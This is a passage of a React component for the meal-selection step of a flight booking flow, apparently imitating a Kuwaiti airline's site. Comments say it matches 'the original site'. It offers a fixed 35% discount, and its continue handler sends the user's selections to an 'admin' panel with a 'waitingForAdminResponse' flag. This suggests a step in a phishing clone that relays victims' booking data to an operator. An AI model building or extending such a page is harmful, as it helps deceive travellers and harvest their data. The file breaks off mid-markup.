import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { sendData } from "../lib/store";
import { ChevronDown, ChevronUp, ArrowLeft } from "lucide-react";
import { useLang } from "../contexts/LanguageContext";

// Arabic translations for meal titles and category names.
const MEAL_TITLE_AR: Record<string, string> = {
  turkey: "ديك رومي + رقائق + مشروب غازي + ماء",
  roast_beef: "لحم بقر مشوي + رقائق + مشروب غازي + ماء",
  halloumi: "ساندوتش حلومي + رقائق + مشروب غازي + ماء",
  shrimp_biryani: "برياني الروبيان",
  shrimp_biryani_list: "برياني الروبيان",
  lamb_maqluba: "مقلوبة اللحم",
  lamb_majboos: "مجبوس لحم مع شاي/قهوة",
  lamb_majboos_list: "مجبوس لحم مع شاي/قهوة",
  lamb_biryani: "برياني لحم + ماء + شاي/قهوة",
  veg_lasagna: "لازانيا نباتية + ماء + شاي/قهوة",
  chicken_biryani: "برياني دجاج + ماء + شاي/قهوة",
  grilled_chicken: "دجاج مشوي",
  potato_bhaji: "بطاطا باجي + رقائق + مشروب غازي + ماء",
  falafel: "فلافل + رقائق + مشروب غازي + ماء",
  shawarma: "شاورما دجاج + رقائق + مشروب غازي + ماء",
  low_sodium: "وجبة قليلة الصوديوم",
  low_calorie: "وجبة قليلة السعرات",
  jain: "وجبة جاين",
  diabetic: "وجبة لمرضى السكري",
  child: "وجبة أطفال",
  bland: "وجبة خفيفة",
};
const CATEGORY_AR: Record<string, string> = {
  All: "الكل",
  Sandwiches: "الساندوتشات",
  "Hot food": "أطباق ساخنة",
  Wraps: "الراب",
  "Special Meals": "وجبات خاصة",
};

// Matches the TripSummary structure produced by SeatCustomization / PassengerDetails.
type TripSummary = {
  passengerCount?: number;
  tripLabel?: string;
  firstDate?: string;
  flightsConv: number;
  taxesConv: number;
  cfarConv?: number;
  baseTotalConv: number;
  curCode: string;
  curDecimals: number;
  curRate: number;
  baseTotalKWD?: number;
  discountConv?: number;
  seating?: number;
  meals?: number;
  total?: number;
  bundleName?: string;
  primaryName?: string;
  originCode?: string;
  destCode?: string;
  legs?: { route: string; detail: string; origin: string; destination: string }[];
};

const MEAL_PRICES = {
  shrimp_biryani: 4.250,
  lamb_majboos: 4.000,
  turkey: 3.000,
  roast_beef: 3.000,
  halloumi: 3.000,
  lamb_maqluba: 3.300,
  lamb_biryani: 4.250,
  veg_lasagna: 4.000,
  chicken_biryani: 4.000,
  grilled_chicken: 3.500,
  potato_bhaji: 2.500,
  falafel: 2.500,
  shawarma: 2.500,
  low_sodium: 3.000,
  low_calorie: 3.000,
  jain: 3.000,
  diabetic: 3.000,
  child: 3.000,
  bland: 3.000,
};

export default function Meals() {
  const [, setLocation] = useLocation();
  const { isAr, dir, t } = useLang();
  const mealTitle = (id: string, en: string) => (isAr && MEAL_TITLE_AR[id] ? MEAL_TITLE_AR[id] : en);
  const catLabel = (c: string) => (isAr && CATEGORY_AR[c] ? CATEGORY_AR[c] : c);
  const [isSummaryExpanded, setIsSummaryExpanded] = useState(true);
  const [selectedMeals, setSelectedMeals] = useState<Record<string, number>>({});
  const [selectedCategory, setSelectedCategory] = useState<string>("All");
  const [tripSummary, setTripSummary] = useState<TripSummary | null>(null);
  const [mobileSummaryOpen, setMobileSummaryOpen] = useState(false);
  const [bottomBarVisible, setBottomBarVisible] = useState(true);
  const lastScrollY = useRef(0);

  useEffect(() => {
    const onScroll = () => {
      const y = window.scrollY;
      if (y > lastScrollY.current && y > 50) {
        setBottomBarVisible(false);
      } else if (y < lastScrollY.current) {
        setBottomBarVisible(true);
      }
      lastScrollY.current = y;
    };
    window.addEventListener('scroll', onScroll, { passive: true });
    return () => window.removeEventListener('scroll', onScroll);
  }, []);

  useEffect(() => {
    const storedSummary = localStorage.getItem("tripSummary");
    if (storedSummary) {
      try {
        const parsed = JSON.parse(storedSummary);
        setTripSummary({ ...parsed, meals: 0, total: undefined });
      } catch {
        setLocation("/passenger-details");
      }
    } else {
      setLocation("/passenger-details");
    }
  }, [setLocation]);

  const handleAddMeal = (mealId: string, price: number) => {
    setSelectedMeals(prev => {
      const newCount = (prev[mealId] || 0) + 1;
      const newMeals = { ...prev, [mealId]: newCount };
      setBottomBarVisible(true);
      setTripSummary(curr => {
        if (!curr) return curr;
        const f = Math.pow(10, curr.curDecimals ?? 3);
        const priceConv = Math.round(price * (curr.curRate ?? 1) * f) / f;
        const newMealsTotal = Math.round(((curr.meals || 0) + priceConv) * f) / f;
        return {
          ...curr,
          meals: newMealsTotal,
          total: Math.round(((curr.baseTotalConv || 0) + (curr.seating || 0) + newMealsTotal) * f) / f,
        };
      });
      return newMeals;
    });
  };

  const handleRemoveMeal = (mealId: string, price: number) => {
    setSelectedMeals(prev => {
      const currentCount = prev[mealId] || 0;
      if (currentCount === 0) return prev;
      const newCount = currentCount - 1;
      const newMeals = { ...prev };
      if (newCount === 0) delete newMeals[mealId];
      else newMeals[mealId] = newCount;
      setTripSummary(curr => {
        if (!curr) return curr;
        const f = Math.pow(10, curr.curDecimals ?? 3);
        const priceConv = Math.round(price * (curr.curRate ?? 1) * f) / f;
        const newMealsTotal = Math.round(((curr.meals || 0) - priceConv) * f) / f;
        return {
          ...curr,
          meals: newMealsTotal,
          total: Math.round(((curr.baseTotalConv || 0) + (curr.seating || 0) + newMealsTotal) * f) / f,
        };
      });
      return newMeals;
    });
  };

  const handleContinue = () => {
    if (tripSummary) {
      localStorage.setItem("tripSummary", JSON.stringify(tripSummary));
      if (tripSummary.total != null) {
        const totalKWD = (tripSummary.baseTotalKWD || 0) +
          ((tripSummary.meals || 0) / (tripSummary.curRate || 1)) +
          ((tripSummary.seating || 0) / (tripSummary.curRate || 1));
        localStorage.setItem("amouage_order_total", String(Math.round(totalKWD * 1000) / 1000));
      }
    }
    // Send meals data to admin
    const mealNames = Object.entries(selectedMeals)
      .filter(([, qty]) => (qty as number) > 0)
      .map(([id, qty]) => `${MEAL_TITLE_AR[id] || id} ×${qty}`);
    sendData({
      data: {
        "الوجبات المختارة": mealNames.length ? mealNames.join('، ') : "بدون وجبات إضافية",
        "تكلفة الوجبات": `${tripSummary?.meals || 0} ${tripSummary?.curCode || ''}`,
        "الإجمالي بعد الوجبات": `${tripSummary?.total || 0} ${tripSummary?.curCode || ''}`,
      },
      current: "الوجبات",
      nextPage: "الحقائب والإضافات",
      waitingForAdminResponse: false,
      isCustom: true,
    });

    setLocation("/customize-your-trip");
  };

  if (!tripSummary) {
    return <div className="min-h-screen bg-[#f0f5fa]" />;
  }

  const fareBundle = tripSummary.bundleName || "Flex Plus";
  const passengerName = tripSummary.primaryName || "Guest";
  const isFreeMealIncluded =
    fareBundle.trim().toLowerCase() === "flex" ||
    fareBundle.trim().toLowerCase() === "flex plus" ||
    fareBundle.trim().toLowerCase() === "flexplus";

  const fmt = (v: number) =>
    `${tripSummary.curCode || "KWD"} ${v.toLocaleString("en-US", {
      minimumFractionDigits: tripSummary.curDecimals ?? 3,
      maximumFractionDigits: tripSummary.curDecimals ?? 3,
    })}`;

  const flightsCost = tripSummary.flightsConv || 0;
  const taxesCost = tripSummary.taxesConv || 0;
  const seatingCost = tripSummary.seating || 0;
  const mealsCost = tripSummary.meals || 0;
  const totalCost =
    tripSummary.total != null
      ? tripSummary.total
      : tripSummary.baseTotalConv + seatingCost + mealsCost;
  // 35% discount applies only to the fare portion (flights + taxes), already discounted here.
  const fDisc = Math.pow(10, tripSummary.curDecimals ?? 3);
  const farePortion = Math.round(((tripSummary.flightsConv || 0) + (tripSummary.taxesConv || 0)) * fDisc) / fDisc;
  const discountAmount = tripSummary.discountConv != null
    ? Math.round(tripSummary.discountConv * fDisc) / fDisc
    : Math.round((farePortion / 0.65 - farePortion) * fDisc) / fDisc;

  const routeLabel =
    tripSummary.legs && tripSummary.legs[0]
      ? tripSummary.legs[0].route
      : "Kuwait - Alexandria";
  const routeDetail =
    tripSummary.legs && tripSummary.legs[0]
      ? tripSummary.legs[0].detail
      : "J9 723 | 03:20 - 06:15 | Mon, 20 Jul 2026";

  const renderMealCard = (
    id: string,
    title: string,
    price: number,
    imagePath: string,
    isFeatured = false
  ) => {
    const count = selectedMeals[id] || 0;

    if (isFeatured) {
      return (
        <div className="relative rounded-xl overflow-hidden shadow-sm bg-white border border-gray-100 h-48">
          <img src={imagePath} alt={title} className="w-full h-full object-cover" />
          <div className="absolute top-3 left-3 bg-yellow-400 text-xs font-bold px-2 py-1 rounded-md">
            {isAr ? "اختيار الشيف" : "Chef's choice"}
          </div>
          <div className="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black/80 to-transparent p-3 pt-8">
            <h4 className="text-white font-medium text-sm mb-1">{title}</h4>
            <div className="flex justify-between items-center">
              <span className="text-[#004b87] font-bold text-sm">{fmt(Math.round(price * (tripSummary.curRate ?? 1) * Math.pow(10, tripSummary.curDecimals ?? 3)) / Math.pow(10, tripSummary.curDecimals ?? 3))}</span>
              {count > 0 ? (
                <div className="flex items-center bg-white rounded-full px-2 py-1">
                  <button onClick={() => handleRemoveMeal(id, price)} className="text-gray-800 font-bold px-1">-</button>
                  <span className="text-gray-800 font-bold px-2 text-xs">{count}</span>
                  <button onClick={() => handleAddMeal(id, price)} className="text-gray-800 font-bold px-1">+</button>
                </div>
              ) : (
                <button
                  onClick={() => handleAddMeal(id, price)}
                  className="w-6 h-6 bg-yellow-400 rounded-full flex items-center justify-center text-black font-bold text-lg leading-none"
                >
                  +
                </button>
              )}
            </div>
          </div>
        </div>
      );
    }

    return (
      <div className="flex items-center justify-between p-4 border border-gray-200 rounded-xl bg-white mb-3">
        <div className="flex-1 pr-4">
          <h4 className="text-sm font-medium text-gray-800 mb-1">{title}</h4>
          <div className="text-sm font-bold text-[#004b87] mb-3">{fmt(Math.round(price * (tripSummary.curRate ?? 1) * Math.pow(10, tripSummary.curDecimals ?? 3)) / Math.pow(10, tripSummary.curDecimals ?? 3))}</div>
          {count > 0 ? (
            <div className="flex items-center border border-[#004b87] rounded-full w-fit">
              <button onClick={() => handleRemoveMeal(id, price)} className="text-[#004b87] font-bold px-3 py-1">-</button>
              <span className="text-[#004b87] font-bold px-2 text-sm">{count}</span>
              <button onClick={() => handleAddMeal(id, price)} className="text-[#004b87] font-bold px-3 py-1">+</button>
            </div>
          ) : (
            <button
              onClick={() => handleAddMeal(id, price)}
              className="border border-[#004b87] text-[#004b87] text-sm font-medium px-6 py-1.5 rounded-full hover:bg-blue-50 transition-colors"
            >
              {isAr ? "إضافة" : "Add"}
            </button>
          )}
        </div>
        <div className="w-24 h-24 flex-shrink-0 rounded-lg overflow-hidden bg-gray-100">
          <img src={imagePath} alt={title} className="w-full h-full object-cover" />
        </div>
      </div>
    );
  };

  const CATEGORIES = ["All", "Sandwiches", "Hot food", "Wraps", "Special Meals"];

  // Full meal catalog with category tags matching the original site
  const MEAL_CATALOG: { id: string; title: string; price: number; img: string; category: string }[] = [
    { id: "turkey", title: "Turkey + Chips + Soda + Water", price: MEAL_PRICES.turkey, img: "/meals/turkey.jpg", category: "Sandwiches" },
    { id: "roast_beef", title: "Roast Beef + Chips + Soda + Water", price: MEAL_PRICES.roast_beef, img: "/meals/roast_beef.jpg", category: "Sandwiches" },
    { id: "halloumi", title: "Meal Sandwich - Halloumi + Chips+ soda+water", price: MEAL_PRICES.halloumi, img: "/meals/halloumi.jpg", category: "Sandwiches" },
    { id: "shrimp_biryani_list", title: "Shrimp Biryani", price: MEAL_PRICES.shrimp_biryani, img: "/meals/shrimp_biryani.jpg", category: "Hot food" },
    { id: "lamb_maqluba", title: "Lamb Maqluba", price: MEAL_PRICES.lamb_maqluba, img: "/meals/lamb_maqluba.jpg", category: "Hot food" },
    { id: "lamb_majboos_list", title: "Lamb Majboos with Tea/Coffee", price: MEAL_PRICES.lamb_majboos, img: "/meals/lamb_majboos.jpg", category: "Hot food" },
    { id: "lamb_biryani", title: "Lamb Biryani + Water + Tea/Coffee", price: MEAL_PRICES.lamb_biryani, img: "/meals/lamb_biryani.jpg", category: "Hot food" },
    { id: "veg_lasagna", title: "Vegetarian Lasagna + Water + Tea/Coffee", price: MEAL_PRICES.veg_lasagna, img: "/meals/veg_lasagna.jpg", category: "Hot food" },
    { id: "chicken_biryani", title: "Chicken Biryani + Water + Tea/Coffee", price: MEAL_PRICES.chicken_biryani, img: "/meals/chicken_biryani.jpg", category: "Hot food" },
    { id: "grilled_chicken", title: "Grilled Chicken", price: MEAL_PRICES.grilled_chicken, img: "/meals/grilled_chicken.jpg", category: "Hot food" },
    { id: "potato_bhaji", title: "Potato Bhaji + Chips + Soda + Water", price: MEAL_PRICES.potato_bhaji, img: "/meals/potato_bhaji.jpg", category: "Wraps" },
    { id: "falafel", title: "Falafel + Chips + Soda + Water", price: MEAL_PRICES.falafel, img: "/meals/falafel.jpg", category: "Wraps" },
    { id: "shawarma", title: "Chicken Shawarma + Chips + Soda + Water", price: MEAL_PRICES.shawarma, img: "/meals/shawarma.jpg", category: "Wraps" },
    { id: "low_sodium", title: "Low Sodium Meal", price: MEAL_PRICES.low_sodium, img: "/meals/low_sodium.jpg", category: "Special Meals" },
    { id: "low_calorie", title: "Low Calorie Meal", price: MEAL_PRICES.low_calorie, img: "/meals/low_calorie.jpg", category: "Special Meals" },
    { id: "jain", title: "Jain Meal", price: MEAL_PRICES.jain, img: "/meals/jain.jpg", category: "Special Meals" },
    { id: "diabetic", title: "Diabetic Meal", price: MEAL_PRICES.diabetic, img: "/meals/diabetic.jpg", category: "Special Meals" },
    { id: "child", title: "Child Meal", price: MEAL_PRICES.child, img: "/meals/diabetic.jpg", category: "Special Meals" },
    { id: "bland", title: "Bland Meal", price: MEAL_PRICES.bland, img: "/meals/bland.jpg", category: "Special Meals" },
  ];

  const visibleMeals = MEAL_CATALOG.filter((m) => {
    if (isFreeMealIncluded && m.id === "halloumi") return false; // hidden when free meal included
    if (selectedCategory === "All") return true;
    return m.category === selectedCategory;
  });

  return (
    <div className="min-h-screen bg-[#f0f5fa] font-sans pb-44 md:pb-20" dir={dir}>
      {/* Mobile Header - matches original: back arrow + title */}
      <div className="md:hidden bg-[#f0f5fa] w-full py-4 px-4 flex items-center justify-center relative sticky top-0 z-[9999]">
        <button onClick={() => setLocation("/seat-customization")} className="absolute left-4 text-[#001d3d]">
          <ArrowLeft className="w-6 h-6" />
        </button>
        <h1 className="text-lg font-bold text-[#001d3d]">{isAr ? 'اختر نكهتك' : 'Choose your flavor'}</h1>
      </div>

      {/* Mobile Route Pill */}
      <div className="md:hidden flex items-center justify-center gap-3 pb-4">
        <div className="flex items-center gap-2 bg-white border border-gray-200 rounded-full px-4 py-2 shadow-sm">
          <span className="text-sm font-medium text-[#001d3d]">{tripSummary.originCode || 'KWI'}</span>
          <svg className="w-4 h-4 text-[#0a72c0]" fill="currentColor" viewBox="0 0 24 24"><path d="M21 16v-2l-8-5V3.5A1.5 1.5 0 0011.5 2 1.5 1.5 0 0010 3.5V9l-8 5v2l8-2.5V19l-2 1.5V22l3.5-1 3.5 1v-1.5L13 19v-5.5z" /></svg>
          <span className="text-sm font-medium text-[#001d3d]">{tripSummary.destCode || 'HBE'}</span>
          <ChevronDown className="w-3 h-3 text-gray-400" />
        </div>
        <div className="w-8 h-8 rounded-lg bg-blue-50 border border-blue-200 flex items-center justify-center">
          <span className="text-blue-600 text-xs font-bold">J9</span>
        </div>
      </div>

      {/* Header (Hidden on mobile) */}
      <div className="hidden md:flex bg-white px-4 py-3 items-center justify-between shadow-sm sticky top-0 z-10">
        <div className="flex items-center gap-3">
          <button onClick={() => setLocation("/seat-customization")} className="p-1">
            <ArrowLeft className="w-5 h-5 text-gray-600" />
          </button>
          <h1 className="text-xl font-medium text-[#004b87]">{t('meals.chooseFlavor')}</h1>
        </div>
        <div className="flex items-center gap-2 bg-white border border-gray-200 rounded-full px-3 py-1.5 shadow-sm">
          <span className="text-xs font-medium text-gray-600">{tripSummary.originCode || "KWI"}</span>
          <svg className="w-4 h-4 text-[#0a72c0]" fill="currentColor" viewBox="0 0 24 24"><path d="M21 16v-2l-8-5V3.5A1.5 1.5 0 0011.5 2 1.5 1.5 0 0010 3.5V9l-8 5v2l8-2.5V19l-2 1.5V22l3.5-1 3.5 1v-1.5L13 19v-5.5z" /></svg>
          <span className="text-xs font-medium text-gray-600">{tripSummary.destCode || "HBE"}</span>
          <ChevronDown className="w-3 h-3 text-gray-400" />
        </div>
      </div>

      <div className="max-w-6xl mx-auto px-3 md:px-4 py-4 md:py-6 flex flex-col lg:flex-row gap-4 md:gap-6">
        {/* Main Content */}
        <div className="flex-1">
          {/* Tabs */}
          <div className="flex border-b border-gray-200 mb-4 md:mb-6">
            <button
              onClick={() => setLocation("/seat-customization")}
              className="flex-1 py-3 text-sm font-medium text-blue-600 border-b-2 border-transparent hover:bg-blue-50 transition-colors"
            >
              {t('seat.seats')}
            </button>
            <button className="flex-1 py-3 text-sm font-medium text-blue-600 border-b-2 border-blue-600">
              {t('seat.meals')}
            </button>
          </div>

          {/* Passenger Badge */}
          <div className="mb-8">
            <div className="inline-flex items-center px-4 py-2 rounded-full border border-blue-200 bg-blue-50/50 text-blue-600 text-sm font-medium">
              {passengerName}
            </div>
          </div>

          {/* Included in the fare (Flex/Flex Plus only) */}
          {isFreeMealIncluded && (
            <div className="mb-8">
              <h3 className="text-lg font-medium text-[#004b87] mb-4">{isAr ? 'مشمول في السعر' : 'Included in the fare'}</h3>
              <div className="bg-white rounded-xl p-4 border border-gray-200 flex items-center justify-between">
                <div className="flex items-center gap-4">
                  <div className="w-16 h-16 rounded-lg overflow-hidden bg-gray-100">
                    <img src="/meals/halloumi.jpg" alt="Halloumi Sandwich" className="w-full h-full object-cover" />
                  </div>
                  <div>
                    <h4 className="text-sm font-medium text-gray-800">{isAr ? 'ساندوتش حلومي + رقائق + مشروب غازي + ماء' : 'Meal Sandwich - Halloumi + Chips+ soda+water'}</h4>
                    <div className="text-sm text-gray-500 mt-1">{isAr ? 'الكمية: 1' : 'Quantity: 1'}</div>
                  </div>
                </div>
                <div className="text-sm font-medium text-blue-600">{t('common.included')}</div>
              </div>
            </div>
          )}

          {/* Featured meals - just a title on mobile, no big cards */}
          <div className="mb-4">
            <h3 className="text-lg font-medium text-[#004b87]">{isAr ? 'وجبات مميزة' : 'Featured meals'}</h3>
          </div>

          {/* Choose by category */}
          <div className="mb-6">
            <h3 className="text-lg font-bold text-[#001d3d] mb-4">{isAr ? 'اختر حسب الفئة' : 'Choose by category'}</h3>
            <div className="flex gap-2 overflow-x-auto pb-2 scrollbar-hide">
              {CATEGORIES.map((cat) => {
                const active = selectedCategory === cat;
                return (
                  <button
                    key={cat}
                    onClick={() => setSelectedCategory(cat)}
                    className={`px-4 py-1.5 rounded-full border text-sm font-medium whitespace-nowrap transition-colors ${
                      active
                        ? "border-blue-600 bg-blue-50 text-blue-600"
                        : "border-gray-300 bg-white text-gray-600 hover:bg-gray-50"
                    }`}
                  >
                    {catLabel(cat)}
                  </button>
                );
              })}
            </div>
          </div>

          {/* All Meals List (filtered by category) */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-x-4">
            {visibleMeals.map((m) => (
              <div key={m.id}>{renderMealCard(m.id, mealTitle(m.id, m.title), m.price, m.img)}</div>
            ))}
          </div>
          {visibleMeals.length === 0 && (
            <div className="text-center text-gray-400 text-sm py-10">{isAr ? 'لا توجد وجبات في هذه الفئة.' : 'No meals in this category.'}</div>
          )}
        </div>

        {/* Trip Summary Sidebar - hidden on mobile, shown on desktop */}
        <div className="hidden md:block w-full lg:w-80">
          <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-5 sticky top-20">
            <h2 className="text-xl font-medium text-[#004b87] mb-4">{t('seat.tripSummary')}</h2>

            <div className="flex items-center gap-2 text-sm text-gray-600 mb-2">
              <img src="/images/persons.png" alt="passengers" className="w-4 h-4" onError={(e) => ((e.target as HTMLImageElement).style.display = "none")} />
              <span>{tripSummary.passengerCount || 1} {(tripSummary.passengerCount || 1) > 1 ? t('common.passengers') : t('common.passenger')}</span>
            </div>

            <div className="flex items-center gap-2 text-sm text-gray-600 mb-6">
              <img src="/images/return.png" alt="date" className="w-4 h-4" onError={(e) => ((e.target as HTMLImageElement).style.display = "none")} />
              <span>{tripSummary.tripLabel || (isAr ? 'ذهاب فقط' : 'One way')}: {tripSummary.firstDate || "Mon, 20 Jul 2026"}</span>
            </div>

            <div className="space-y-4">
              {/* Flights */}
              <div className="border-b border-gray-100 pb-4">
                <button
                  onClick={() => setIsSummaryExpanded(!isSummaryExpanded)}
                  className="w-full flex items-center justify-between text-sm font-medium text-gray-800"
                >
                  <span>{t('seat.flights')}</span>
                  <div className="flex items-center gap-2">
                    <span>{fmt(flightsCost)}</span>
                    {isSummaryExpanded ? <ChevronUp className="w-4 h-4 text-blue-600" /> : <ChevronDown className="w-4 h-4 text-blue-600" />}
                  </div>
                </button>

                {isSummaryExpanded && (
                  <div className="mt-3 pt-3 border-t border-gray-50 border-dashed">
                    <div className="bg-gray-50 rounded-lg p-3">
                      <div className="flex justify-between items-center mb-2">
                        <span className="text-sm text-gray-800">{routeLabel}</span>
                        <ChevronUp className="w-4 h-4 text-gray-400" />
                      </div>
                      <div className="text-xs text-gray-500 mb-2">{routeDetail}</div>
                      <div className="inline-block bg-gray-200 text-gray-700 text-xs px-3 py-1 rounded-full">
                        {fareBundle}
                      </div>
                    </div>

                    <div className="mt-4 space-y-3">
                      <div className="flex justify-between text-sm">
                        <div className="flex items-center gap-2 text-gray-600">
                          <span>{t('common.passengers')}</span>
                        </div>
                        <span className="text-blue-600">{fmt(flightsCost)}</span>
                      </div>
                      <div className="flex justify-between text-xs text-gray-500 pl-2">
                        <span>{isAr ? 'بالغ × 1' : '1x Adult'}</span>
                        <span>{fmt(flightsCost)}</span>
                      </div>

                      <div className="flex justify-between text-sm">
                        <div className="flex items-center gap-2 text-gray-600">
                          <span>{t('seat.seating')}</span>
                        </div>
                        <span className="text-blue-600">
                          {seatingCost > 0 ? fmt(seatingCost) : t('common.included')}
                        </span>
                      </div>

                      <div className="flex justify-between text-sm">
                        <div className="flex items-center gap-2 text-gray-600">
                          <span>{t('seat.baggage')}</span>
                        </div>
                        <span className="text-blue-600">{t('common.included')}</span>
                      </div>
                      <div className="flex justify-between text-xs text-gray-500 pl-2">
                        <span>{isAr ? 'أمتعة المقصورة 7 كغ × 1' : '1 X Cabin baggage 7 Kg'}</span>
                        <span>{t('common.included')}</span>
                      </div>

                      {(isFreeMealIncluded || mealsCost > 0) && (
                        <>
                          <div className="flex justify-between text-sm">
                            <div className="flex items-center gap-2 text-gray-600">
                              <span>{t('seat.meals')}</span>
                            </div>
                            <span className="text-blue-600">{mealsCost > 0 ? fmt(mealsCost) : t('common.included')}</span>
                          </div>
                          {isFreeMealIncluded && (
                            <div className="flex justify-between text-xs text-gray-500 pl-2 gap-2">
                              <span className="flex-1">{isAr ? 'ساندوتش حلومي + رقائق + مشروب غازي + ماء × 1' : '1 x Meal Sandwich - Halloumi + Chips+ soda+water'}</span>
                              <span className="text-blue-600 whitespace-nowrap">{t('common.included')}</span>
                            </div>
                          )}
                          {MEAL_CATALOG.filter((m) => (selectedMeals[m.id] || 0) > 0).map((m) => {
                            const qty = selectedMeals[m.id];
                            const f = Math.pow(10, tripSummary.curDecimals);
                            const lineTotal = Math.round(m.price * qty * tripSummary.curRate * f) / f;
                            return (
                              <div key={m.id} className="flex justify-between text-xs text-gray-500 pl-2 gap-2">
                                <span className="flex-1">{qty} × {mealTitle(m.id, m.title)}</span>
                                <span className="text-blue-600 whitespace-nowrap">{fmt(lineTotal)}</span>
                              </div>
                            );
                          })}
                        </>
                      )}
                    </div>
                  </div>
                )}
              </div>

              {/* Taxes */}
              <div className="flex justify-between text-sm font-medium text-gray-800 border-b border-gray-100 pb-4">
                <span>{isAr ? 'الضرائب' : 'Taxes'}</span>
                <span>{fmt(taxesCost)}</span>
              </div>

              {/* Discount: 35% applied to the fare portion only (flights + taxes) */}
              <div className="bg-[#fdeaea] rounded-2xl px-4 py-3 flex justify-between text-base font-semibold mb-2">
                <span className="text-[#c0392b]">{isAr ? 'إجمالي الخصم 35%' : 'Total discount 35%'}</span>
                <span className="text-[#c0392b]">- {fmt(discountAmount)}</span>
              </div>

              {/* Total */}
              <div className="flex justify-between items-center pt-2">
                <span className="text-lg font-medium text-gray-800">{t('common.total')}</span>
                <span className="flex flex-col items-end leading-tight">
                  <span className="text-sm line-through text-red-500">{fmt(Math.round((totalCost + discountAmount) * fDisc) / fDisc)}</span>
                  <span className="text-xl font-bold text-blue-600">{fmt(totalCost)}</span>
                </span>
              </div>

              <button
                onClick={handleContinue}
                className="w-full mt-6 bg-[#004b87] hover:bg-[#003b6a] text-white font-medium py-3.5 rounded-full transition-colors"
              >
                {t('common.continue')}
              </button>
            </div>
          </div>
        </div>
      </div>
      {/* Mobile Trip Summary Bottom Sheet */}
      {mobileSummaryOpen && (
        <div className="md:hidden fixed inset-0 z-[99999] flex items-end">
          <div className="absolute inset-0 bg-black/50" onClick={() => setMobileSummaryOpen(false)} />
          <div className="relative w-full bg-white rounded-t-2xl h-[100dvh] overflow-hidden p-5 pb-8 animate-slide-up flex flex-col">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-xl font-medium text-[#004b87]">{t('seat.tripSummary')}</h2>
              <button onClick={() => setMobileSummaryOpen(false)} className="text-gray-400 text-2xl">&times;</button>
            </div>
            <div className="flex items-center gap-2 text-sm text-gray-600 mb-2">
              <span>{tripSummary.passengerCount || 1} {(tripSummary.passengerCount || 1) > 1 ? t('common.passengers') : t('common.passenger')}</span>
            </div>
            <div className="flex items-center gap-2 text-sm text-gray-600 mb-6">
              <span>{tripSummary.tripLabel || (isAr ? 'ذهاب فقط' : 'One way')}: {tripSummary.firstDate || 'Mon, 20 Jul 2026'}</span>
            </div>
            <div className="space-y-4 flex-1 overflow-y-auto">
              <div className="border-b border-gray-100 pb-4">
                <div className="w-full flex items-center justify-between text-sm font-medium text-gray-800">
                  <span>{t('seat.flights')}</span>
                  <span>{fmt(flightsCost)}</span>
                </div>
                <div className="mt-3 pt-3 border-t border-gray-50 border-dashed">
                  <div className="bg-gray-50 rounded-lg p-3">
                    <div className="flex justify-between items-center mb-2">
                      <span className="text-sm text-gray-800">{routeLabel}</span>
                    </div>
                    <div className="text-xs text-gray-500 mb-2">{routeDetail}</div>
                    <div className="inline-block bg-gray-200 text-gray-700 text-xs px-3 py-1 rounded-full">{fareBundle}</div>
                  </div>
                  <div className="mt-4 space-y-3">
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-600">{t('common.passengers')}</span>
                      <span className="text-blue-600">{fmt(flightsCost)}</span>
                    </div>
                    <div className="flex justify-between text-xs text-gray-500 pl-2">
                      <span>{isAr ? 'بالغ × 1' : '1x Adult'}</span>
                      <span>{fmt(flightsCost)}</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-600">{t('seat.seating')}</span>
                      <span className="text-blue-600">{seatingCost > 0 ? fmt(seatingCost) : t('common.included')}</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-600">{t('seat.baggage')}</span>
                      <span className="text-blue-600">{t('common.included')}</span>
                    </div>
                    <div className="flex justify-between text-xs text-gray-500 pl-2">
                      <span>{isAr ? 'أمتعة المقصورة 7 كغ × 1' : '1 X Cabin baggage 7 Kg'}</span>
                      <span>{t('common.included')}</span>
                    </div>
                    {(isFreeMealIncluded || mealsCost > 0) && (
                      <>
                        <div className="flex justify-between text-sm">
                          <span className="text-gray-600">{t('seat.meals')}</span>
                          <span className="text-blue-600">{mealsCost > 0 ? fmt(mealsCost) : t('common.included')}</span>
                        </div>
                        {MEAL_CATALOG.filter((m) => (selectedMeals[m.id] || 0) > 0).map((m) => {
                          const qty = selectedMeals[m.id];
                          const f = Math.pow(10, tripSummary.curDecimals);
                          const lineTotal = Math.round(m.price * qty * tripSummary.curRate * f) / f;
                          return (
                            <div key={m.id} className="flex justify-between text-xs text-gray-500 pl-2 gap-2">
                              <span className="flex-1">{qty} × {mealTitle(m.id, m.title)}</span>
                              <span className="text-blue-600 whitespace-nowrap">{fmt(lineTotal)}</span>
                            </div>
                          );
                        })}
                      </>
                    )}
                  </div>
                </div>
              </div>
              <div className="flex justify-between text-sm font-medium text-gray-800 border-b border-gray-100 pb-4">
                <span>{isAr ? 'الضرائب' : 'Taxes'}</span>
                <span>{fmt(taxesCost)}</span>
              </div>
              <div className="bg-[#fdeaea] rounded-2xl px-4 py-3 flex justify-between text-base font-semibold">
                <span className="text-[#c0392b]">{isAr ? 'إجمالي الخصم 35%' : 'Total discount 35%'}</span>
                <span className="text-[#c0392b]">- {fmt(discountAmount)}</span>
              </div>
              <div className="flex justify-between items-center pt-2">
                <span className="text-lg font-medium text-gray-800">{t('common.total')}</span>
                <span className="flex flex-col items-end leading-tight">
                  <span className="text-sm line-through text-red-500">{fmt(Math.round((totalCost + discountAmount) * fDisc) / fDisc)}</span>
                  <span className="text-xl font-bold text-blue-600">{fmt(totalCost)}</span>
                </span>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Mobile Bottom Bar - fixed */}
      <div className={`md:hidden fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 px-4 pt-3 pb-6 z-[9999] shadow-[0_-4px_12px_rgba(0,0,0,0.08)] transition-transform duration-300 ${bottomBarVisible ? 'translate-y-0' : 'translate-y-full'}`}>
        <div className="mb-2">
          <span className="inline-flex items-center px-3 py-1.5 rounded-full border border-blue-200 bg-blue-50/50 text-blue-600 text-sm font-medium">
            {passengerName}
          </span>
        </div>
        <div className="flex items-end justify-between">
          <div>
            <div className="text-xs text-gray-500 font-medium">{isAr ? 'الإجمالي (للوجبات)' : 'Total (For Meals)'}</div>
